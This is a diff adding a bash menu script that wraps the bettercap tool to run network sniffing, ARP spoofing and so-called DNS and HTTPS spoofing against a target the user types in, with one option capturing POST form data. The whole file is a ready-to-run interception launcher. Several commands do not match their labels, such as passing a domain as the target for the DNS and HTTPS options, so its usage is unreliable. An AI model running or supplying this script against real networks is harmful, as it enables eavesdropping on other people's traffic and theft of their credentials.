@@ -1,0 +1,45 @@
+#!/bin/bash
+
+while :
+do
+    clear
+    echo "======================="
+    echo "     BETTERCAP MENU     "
+    echo "======================="
+    echo "1. Sniffing"
+    echo "2. ARP Spoofing"
+    echo "3. DNS Spoofing"
+    echo "4. HTTPS Spoofing"
+    echo "5. Exit"
+    echo "======================="
+    read -p "Enter your choice [1-5]: " choice
+
+    case $choice in
+        1)
+            sudo bettercap -X
+            read -p "Press enter to continue"
+            ;;
+        2)
+            read -p "Enter the target IP address: " target_ip
+            sudo bettercap -T $target_ip --proxy -X
+            read -p "Press enter to continue"
+            ;;
+        3)
+            read -p "Enter the domain to spoof: " domain
+            sudo bettercap -T $domain --proxy -X
+            read -p "Press enter to continue"
+            ;;
+        4)
+            read -p "Enter the domain to spoof: " domain
+            sudo bettercap -T $domain --proxy -P POST -X
+            read -p "Press enter to continue"
+            ;;
+        5)
+            exit 0
+            ;;
+        *)
+            echo "Invalid choice"
+            read -p "Press enter to continue"
+            ;;
+    esac
+done
